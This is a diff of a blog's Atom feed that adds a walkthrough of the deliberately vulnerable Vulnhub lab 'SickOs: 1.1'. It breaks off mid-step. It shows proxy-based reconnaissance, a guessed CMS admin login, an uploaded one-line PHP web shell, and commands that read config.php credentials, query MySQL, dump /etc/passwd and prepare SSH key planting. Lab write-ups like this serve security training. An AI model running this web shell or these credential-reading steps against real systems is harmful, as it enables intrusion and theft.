@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Vulnhub | 0x73696e65]]></title>
   <link href="http://73696e65.github.io/blog/categories/vulnhub/atom.xml" rel="self"/>
   <link href="http://73696e65.github.io/"/>
-  <updated>2015-08-25T21:46:37+02:00</updated>
+  <updated>2015-12-12T12:41:40+01:00</updated>
   <id>http://73696e65.github.io/</id>
   <author>
     <name><![CDATA[Norbert Szetei]]></name>
@@ -12,6 +12,678 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[SickOs: 1.1]]></title>
+    <link href="http://73696e65.github.io/blog/2015/12/12/sickos-1-dot-1/"/>
+    <updated>2015-12-12T11:21:39+01:00</updated>
+    <id>http://73696e65.github.io/blog/2015/12/12/sickos-1-dot-1</id>
+    <content type="html"><![CDATA[<p>Image: <a href="https://www.vulnhub.com/entry/sickos-11,132/">SickOs: 1.1</a></p>
+
+<p>Nmap output:
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ nmap 192.168.80.169
+</span><span class='line'>22/tcp   open   ssh
+</span><span class='line'>3128/tcp open   squid-http
+</span><span class='line'>8080/tcp closed http-proxy</span></code></pre></td></tr></table></div></figure></p>
+
+<p>There is an open proxy, we try internal network reconnaissance:
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &lt;a href="http://192.168.80.169">http://192.168.80.169&lt;/a>&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;h1>
+</span><span class='line'>BLEHHH!!!
+</span><span class='line'>&lt;/h1>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>&lt;p></span></code></pre></td></tr></table></div></figure></p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ dirb &lt;a href="http://192.168.80.169:80">http://192.168.80.169:80&lt;/a> -p 192.168.80.169:3128
+</span><span class='line'>&hellip;
+</span><span class='line'>+ &lt;a href="http://192.168.80.169:80/cgi-bin/">http://192.168.80.169:80/cgi-bin/&lt;/a> (CODE:403|SIZE:290)
+</span><span class='line'>+ &lt;a href="http://192.168.80.169:80/connect">http://192.168.80.169:80/connect&lt;/a> (CODE:200|SIZE:109)
+</span><span class='line'>+ &lt;a href="http://192.168.80.169:80/index">http://192.168.80.169:80/index&lt;/a> (CODE:200|SIZE:21)
+</span><span class='line'>+ &lt;a href="http://192.168.80.169:80/index.php">http://192.168.80.169:80/index.php&lt;/a> (CODE:200|SIZE:21)
+</span><span class='line'>+ &lt;a href="http://192.168.80.169:80/robots">http://192.168.80.169:80/robots&lt;/a> (CODE:200|SIZE:45)
+</span><span class='line'>+ &lt;a href="http://192.168.80.169:80/robots.txt">http://192.168.80.169:80/robots.txt&lt;/a> (CODE:200|SIZE:45)
+</span><span class='line'>+ &lt;a href="http://192.168.80.169:80/server-status">http://192.168.80.169:80/server-status&lt;/a> (CODE:403|SIZE:295)</span></code></pre></td></tr></table></div></figure></p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &lt;a href="http://192.168.80.169:80/robots.txt">http://192.168.80.169:80/robots.txt&lt;/a>
+</span><span class='line'>User-agent: *
+</span><span class='line'>Disallow: /
+</span><span class='line'>Dissalow: /wolfcms</span></code></pre></td></tr></table></div></figure></p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &lt;a href="http://192.168.80.169:80/connect">http://192.168.80.169:80/connect&lt;/a>&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;h1>!/usr/bin/python&lt;/h1>
+</span><span class='line'>
+</span><span class='line'>&lt;p>print &ldquo;I Try to connect things very frequently\n&rdquo;
+</span><span class='line'>print &ldquo;You may want to try my services&rdquo;</span></code></pre></td></tr></table></div></figure></p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &lt;a href="http://192.168.80.169:80/wolfcms/">http://192.168.80.169:80/wolfcms/&lt;/a></span></code></pre></td></tr></table></div></figure></p>
+
+<p>We found the Wolf CMS and to have easier access, we set the HTTP proxy in
+Firefox. After a little googling, we found this
+<a href="https://www.exploit-db.com/exploits/36818/">exploit</a>, but it only uploads php
+shell and we can do this manually. To use this technique, we need credentials to log in via
+<a href="http://192.168.80.169/wolfcms/?/admin/">admin interface</a>. One of our first guesses was
+<code>admin/admin</code>, so we upload the file with the following content for RCE:</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span> <span class="nb">system</span><span class="p">(</span><span class="nv">$_REQUEST</span><span class="p">[</span><span class="nx">cmd</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="x"></span>
+</span></code></pre></td></tr></table></div></figure></p>
+
+<p>As we can read in exploit, the uploaded files are available in <code>public</code> directory. Invoking a few commands:</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=ls+-la">http://192.168.80.169/wolfcms/public/a.php?cmd=ls+-la&lt;/a>
+</span><span class='line'>total 20
+</span><span class='line'>drwxrwxrwx 4 root     root     4096 Dec 12 12:25 .
+</span><span class='line'>drwxr-xr-x 5 root     root     4096 Dec  5 06:33 ..
+</span><span class='line'>-rw-r&ndash;r&ndash; 1 www-data www-data   32 Dec 12 12:29 a.php
+</span><span class='line'>drwxrwxrwx 2 root     root     4096 Dec  5 06:05 images
+</span><span class='line'>drwxrwxrwx 4 root     root     4096 Dec  5 06:05 themes</span></code></pre></td></tr></table></div></figure></p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;&lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=ls+-la+../">http://192.168.80.169/wolfcms/public/a.php?cmd=ls+-la+../&lt;/a>&rdquo;
+</span><span class='line'>total 52
+</span><span class='line'>drwxr-xr-x 5 root root 4096 Dec  5 06:33 .
+</span><span class='line'>drwxrwxrwx 3 root root 4096 Dec  6 21:15 ..
+</span><span class='line'>-rwxr-xr-x 1 root root  950 Dec  5 06:15 .htaccess
+</span><span class='line'>-rwxrwxrwx 1 root root 4084 Dec  5 06:15 CONTRIBUTING.md
+</span><span class='line'>-rwxrwxrwx 1 root root 2405 Dec  5 06:15 README.md
+</span><span class='line'>-rwxrwxrwx 1 root root  403 Dec  5 06:15 composer.json
+</span><span class='line'>-rwxrwxrwx 1 root root 3058 Dec  5 07:26 config.php
+</span><span class='line'>drwxrwxrwx 2 root root 4096 Dec  5 06:15 docs
+</span><span class='line'>-rwxrwxrwx 1 root root  894 Dec  5 06:15 favicon.ico
+</span><span class='line'>-rwxrwxrwx 1 root root 6815 Dec  5 06:32 index.php
+</span><span class='line'>drwxrwxrwx 4 root root 4096 Dec 12 12:25 public
+</span><span class='line'>-rwxrwxrwx 1 root root    0 Dec  5 06:15 robots.txt
+</span><span class='line'>drwxrwxrwx 7 root root 4096 Dec  5 06:25 wolf</span></code></pre></td></tr></table></div></figure></p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=netstat+-nalutp">http://192.168.80.169/wolfcms/public/a.php?cmd=netstat+-nalutp&lt;/a>
+</span><span class='line'>Active Internet connections (servers and established)
+</span><span class='line'>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+</span><span class='line'>tcp        0      0 127.0.0.1:3306          0.0.0.0:&lt;em>               LISTEN      -
+</span><span class='line'>tcp        0      0 0.0.0.0:80              0.0.0.0:&lt;/em>               LISTEN      -
+</span><span class='line'>tcp        0      0 0.0.0.0:22              0.0.0.0:&lt;em>               LISTEN      -
+</span><span class='line'>tcp        0      0 192.168.80.169:80       192.168.80.169:60664    TIME_WAIT   -
+</span><span class='line'>tcp        0      0 192.168.80.169:80       192.168.80.169:60665    TIME_WAIT   -
+</span><span class='line'>tcp        0      0 192.168.80.169:80       192.168.80.169:60667    ESTABLISHED -
+</span><span class='line'>tcp        0      0 192.168.80.169:80       192.168.80.169:60666    TIME_WAIT   -
+</span><span class='line'>tcp        1      0 192.168.80.169:80       192.168.80.169:60662    CLOSE_WAIT  -
+</span><span class='line'>tcp        1      0 192.168.80.169:80       192.168.80.169:60663    CLOSE_WAIT  -
+</span><span class='line'>tcp        1      0 192.168.80.169:80       192.168.80.169:60661    CLOSE_WAIT  -
+</span><span class='line'>tcp6       0      0 :::22                   :::&lt;/em>                    LISTEN      -
+</span><span class='line'>tcp6       0      0 :::3128                 :::&lt;em>                    LISTEN      -
+</span><span class='line'>tcp6       0      0 192.168.80.169:60667    192.168.80.169:80       ESTABLISHED -
+</span><span class='line'>tcp6       0      0 192.168.80.169:3128     192.168.80.137:54390    ESTABLISHED -
+</span><span class='line'>udp        0      0 192.168.80.169:45534    192.168.80.2:53         ESTABLISHED 1703/netstat
+</span><span class='line'>udp        0      0 192.168.80.169:37938    192.168.80.2:53         ESTABLISHED 1701/netstat
+</span><span class='line'>udp        0      0 0.0.0.0:68              0.0.0.0:&lt;/em>                           -
+</span><span class='line'>udp        0      0 192.168.80.169:39007    192.168.80.2:53         ESTABLISHED 1705/netstat
+</span><span class='line'>udp        0      0 0.0.0.0:53488           0.0.0.0:*                           -
+</span><span class='line'>udp6       0      0 :::43051</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Here we found the database user credentials:
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;&lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=cat+../config.php">http://192.168.80.169/wolfcms/public/a.php?cmd=cat+../config.php&lt;/a>&rdquo;
+</span><span class='line'>&lt;?php&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>// Database information:
+</span><span class='line'>// for SQLite, use sqlite:/tmp/wolf.db (SQLite 3)
+</span><span class='line'>// The path can only be absolute path or :memory:
+</span><span class='line'>// For more info look at: www.php.net/pdo&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>// Database settings:
+</span><span class='line'>define(&lsquo;DB_DSN&rsquo;, &lsquo;mysql:dbname=wolf;host=localhost;port=3306&rsquo;);
+</span><span class='line'>define(&lsquo;DB_USER&rsquo;, &lsquo;root&rsquo;);
+</span><span class='line'>define(&lsquo;DB_PASS&rsquo;, &lsquo;john@123&rsquo;);
+</span><span class='line'>define(&lsquo;TABLE_PREFIX&rsquo;, &lsquo;&rsquo;);
+</span><span class='line'>&hellip;</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Examining the MySQL database:</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;&lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=echo+mysql+-uroot+-pjohn@123+-e+status">http://192.168.80.169/wolfcms/public/a.php?cmd=echo+mysql+-uroot+-pjohn@123+-e+status&lt;/a>&rdquo;
+</span><span class='line'>mysql -uroot -pjohn@123 -e status&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;h2>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;&lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=mysql+-uroot+-pjohn@123+-e+status">http://192.168.80.169/wolfcms/public/a.php?cmd=mysql+-uroot+-pjohn@123+-e+status&lt;/a>&rdquo;&lt;/h2>
+</span><span class='line'>
+</span><span class='line'>&lt;p>mysql  Ver 14.14 Distrib 5.5.46, for debian-linux-gnu (i686) using readline 6.2&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>Connection id:          149
+</span><span class='line'>Current database:
+</span><span class='line'>Current user:           root@localhost
+</span><span class='line'>SSL:                    Not in use
+</span><span class='line'>Current pager:          stdout
+</span><span class='line'>Using outfile:          &lsquo;&rsquo;
+</span><span class='line'>Using delimiter:        ;
+</span><span class='line'>Server version:         5.5.46-0ubuntu0.12.04.2 (Ubuntu)
+</span><span class='line'>Protocol version:       10
+</span><span class='line'>Connection:             Localhost via UNIX socket
+</span><span class='line'>Server characterset:    latin1
+</span><span class='line'>Db     characterset:    latin1
+</span><span class='line'>Client characterset:    latin1
+</span><span class='line'>Conn.  characterset:    latin1
+</span><span class='line'>UNIX socket:            /var/run/mysqld/mysqld.sock
+</span><span class='line'>Uptime:                 1 hour 1 min 49 sec&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>Threads: 1  Questions: 2646  Slow queries: 0  Opens: 64  Flush tables: 1  Open tables: 57  Queries per second avg: 0.713&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;&lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=mysql+-uroot+-pjohn@123+-e">http://192.168.80.169/wolfcms/public/a.php?cmd=mysql+-uroot+-pjohn@123+-e&lt;/a>'show+databases'&rdquo;
+</span><span class='line'>Database
+</span><span class='line'>information_schema
+</span><span class='line'>mysql
+</span><span class='line'>performance_schema
+</span><span class='line'>wolf</span></code></pre></td></tr></table></div></figure></p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;&lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=mysql+-uroot+-pjohn@123+wolf+-e">http://192.168.80.169/wolfcms/public/a.php?cmd=mysql+-uroot+-pjohn@123+wolf+-e&lt;/a>'show+tables'&rdquo;
+</span><span class='line'>Tables_in_wolf
+</span><span class='line'>cron
+</span><span class='line'>layout
+</span><span class='line'>page
+</span><span class='line'>page_part
+</span><span class='line'>page_tag
+</span><span class='line'>permission
+</span><span class='line'>plugin_settings
+</span><span class='line'>role
+</span><span class='line'>role_permission
+</span><span class='line'>secure_token
+</span><span class='line'>setting
+</span><span class='line'>snippet
+</span><span class='line'>tag
+</span><span class='line'>user
+</span><span class='line'>user_role</span></code></pre></td></tr></table></div></figure></p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;&lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=mysql+-uroot+-pjohn@123+wolf+-e">http://192.168.80.169/wolfcms/public/a.php?cmd=mysql+-uroot+-pjohn@123+wolf+-e&lt;/a>'select+*+from+user'&rdquo;
+</span><span class='line'>id      name    email   username        password        salt    language        last_login      last_failure    failure_count   created_on      updated_on created_by_id   updated_by_id
+</span><span class='line'>1       Administrator   &lt;a href="&#109;&#97;&#x69;&#x6c;&#x74;&#111;&#x3a;&#97;&#x64;&#109;&#105;&#x6e;&#64;&#121;&#x6f;&#117;&#114;&#x73;&#x69;&#116;&#101;&#46;&#x63;&#x6f;&#109;">&#97;&#x64;&#x6d;&#105;&#110;&#x40;&#x79;&#111;&#117;&#114;&#115;&#x69;&#x74;&#101;&#46;&#x63;&#111;&#x6d;&lt;/a>      admin   3a1be46a798dce0d880f633ce195b676839a0ce344c917a7ea1270816dcb649ce1e2b811b56fe93c9d3c4e679151180129ee9483ea39bff4d4578c4be6c77e1f   6806b774443f2c34231eceddf156a42d3c26a2b5219ee9d55f5e3c9aea534167        en      2015-12-12 12:23:33     NULL       0       2015-12-05 06:25:06     2015-12-12 12:23:33     1       NULL</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Nothing interesting here, there is only one user and we already know his password.</p>
+
+<p>We noticed that the user <code>www-data</code> has shell access:
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;&lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=cat+/etc/passwd">http://192.168.80.169/wolfcms/public/a.php?cmd=cat+/etc/passwd&lt;/a>&rdquo;
+</span><span class='line'>root:x:0:0:root:/root:/bin/bash
+</span><span class='line'>daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+</span><span class='line'>bin:x:2:2:bin:/bin:/bin/sh
+</span><span class='line'>sys:x:3:3:sys:/dev:/bin/sh
+</span><span class='line'>sync:x:4:65534:sync:/bin:/bin/sync
+</span><span class='line'>games:x:5:60:games:/usr/games:/bin/sh
+</span><span class='line'>man:x:6:12:man:/var/cache/man:/bin/sh
+</span><span class='line'>lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+</span><span class='line'>mail:x:8:8:mail:/var/mail:/bin/sh
+</span><span class='line'>&lt;a href="news:x:9:9:news:/var/spool/news:/bin/sh">news:x:9:9:news:/var/spool/news:/bin/sh&lt;/a>
+</span><span class='line'>uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+</span><span class='line'>proxy:x:13:13:proxy:/bin:/bin/sh
+</span><span class='line'>www-data:x:33:33:www-data:/var/www:/bin/sh
+</span><span class='line'>backup:x:34:34:backup:/var/backups:/bin/sh
+</span><span class='line'>list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+</span><span class='line'>irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+</span><span class='line'>gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+</span><span class='line'>nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+</span><span class='line'>libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+</span><span class='line'>syslog:x:101:103::/home/syslog:/bin/false
+</span><span class='line'>messagebus:x:102:105::/var/run/dbus:/bin/false
+</span><span class='line'>whoopsie:x:103:106::/nonexistent:/bin/false
+</span><span class='line'>landscape:x:104:109::/var/lib/landscape:/bin/false
+</span><span class='line'>sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
+</span><span class='line'>sickos:x:1000:1000:sickos,,,:/home/sickos:/bin/bash
+</span><span class='line'>mysql:x:106:114:MySQL Server,,,:/nonexistent:/bin/false</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Next idea is to upload ssh authorization key and log in via ssh.</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;&lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=id">http://192.168.80.169/wolfcms/public/a.php?cmd=id&lt;/a>&rdquo;
+</span><span class='line'>uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></code></pre></td></tr></table></div></figure></p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;&lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=ls+-la+~www-data">http://192.168.80.169/wolfcms/public/a.php?cmd=ls+-la+~www-data&lt;/a>&rdquo;
+</span><span class='line'>total 24
+</span><span class='line'>drwxrwxrwx  3 root root 4096 Dec  6 21:15 .
+</span><span class='line'>drwxr-xr-x 13 root root 4096 Dec 12 11:55 ..
+</span><span class='line'>-rwxrwxrwx  1 root root  109 Dec  5 07:57 connect.py
+</span><span class='line'>-rw-r&ndash;r&ndash;  1 root root   21 Dec  5 06:05 index.php
+</span><span class='line'>-rw-r&ndash;r&ndash;  1 root root   45 Dec  5 06:05 robots.txt
+</span><span class='line'>drwxr-xr-x  5 root root 4096 Dec  5 06:33 wolfcms&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;&lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=mkdir+~www-data/.ssh">http://192.168.80.169/wolfcms/public/a.php?cmd=mkdir+~www-data/.ssh&lt;/a>&rdquo;
+</span><span class='line'>root@kali32:~$ curl &ndash;proxy 192.168.80.169:3128 &ldquo;&lt;a href="http://192.168.80.169/wolfcms/public/a.php?cmd=ls+-la+~www-data">http://192.168.80.169/wolfcms/public/a.php?cmd=ls+-la+~www-data&lt;/a>&rdquo;
+</span><span class='line'>total 28
+</span><span class='line'>drwxrwxrwx  4 root     root     4096 Dec 12 13:07 .
+</span><span class='line'>drwxr-xr-x 13 root     root     4096 Dec 12 11:55 ..
+</span><span class='line'>drwxr-xr-x  2 www-data www-data 4096 Dec 12 13:07 .ssh
+</span><span class='line'>-rwxrwxrwx  1 root     root      109 Dec  5 07:57 connect.py
+</span><span class='line'>-rw-r&ndash;r&ndash;  1 root     root       21 Dec  5 06:05 index.php
+</span><span class='line'>-rw-r&ndash;r&ndash;  1 root     root       45 Dec  5 06:05 robots.txt
+</span><span class='line'>drwxr-xr-x  5 root     root     4096 Dec  5 06:33 wolfcms</span></code></pre></td></tr></table></div></figure></p>
+
+<p>We created the directory for <code>authorized_keys</code> file:
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali32:~$ ssh-keygen -P &ldquo;&rdquo; -f blabla
+</span><span class='line'>Generating public/private rsa key pair.
+</span><span class='line'>Your identification has been saved in blabla.
+</span><span class='line'>Your public key has been saved in blabla.pub.
+</span><span class='line'>The key fingerprint is:
+</span><span class='line'>4d:31:fb:7e:bd:82:c9:7f:21:ce:51:91:f3:76:a3:14 root@kali32
+</span><span class='line'>The key&rsquo;s randomart image is:
+</span><span class='line'>+&mdash;[RSA 2048]&mdash;-+
+</span><span class='line'>|          o     .|
+</span><span class='line'>|           + E + |
+</span><span class='line'>|          o   . +|
+</span><span class='line'>|         o . . o+|
+</span><span class='line'>|        S . o o.o|
+</span><span class='line'>|           . + o |
+</span><span class='line'>|          . * + o|
+</span><span class='line'>|           + = ..|
+</span><span class='line'>|            ..o. |
+</span><span class='line'>+&mdash;&mdash;&mdash;&mdash;&mdash;&ndash;+&lt;/p>
+</span><span class='line'>
+</span><span class='line'>&lt;p>root@kali32:~$ cat blabla.pub
